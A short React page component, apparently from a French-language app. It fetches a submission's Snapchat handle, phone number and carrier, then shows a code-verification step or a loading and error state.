import { useState, useEffect } from "react";
import { base44 } from "@/api/base44Client";
import CodeVerification from "@/components/CodeVerification";

export default function CodePage({ submissionId, onCodeSubmit }) {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await base44.functions.invoke("checkStatus", { submissionId });
        if (res?.data) {
          setData({
            snapchat: res.data.snapchat || "@unknown",
            telephone: res.data.telephone || "0000000000",
            operateur: res.data.operateur || "Unknown"
          });
        }
      } catch (error) {
        console.error("Failed to load submission data:", error);
      } finally {
        setLoading(false);
      }
    };
    fetchData();
  }, [submissionId]);

  if (loading) {
    return (
      <div className="flex items-center justify-center py-20">
        <div className="w-8 h-8 border-4 border-slate-200 border-t-slate-800 rounded-full animate-spin"></div>
      </div>
    );
  }

  return data ? (
    <CodeVerification data={data} onSubmit={onCodeSubmit} loading={false} onExpire={() => window.location.href = "/"} />
  ) : (
    <div className="bg-card border border-border rounded-2xl px-6 py-10 text-center shadow-xl">
      <p className="text-muted-foreground text-sm">Impossible de charger les données.</p>
    </div>
  );
}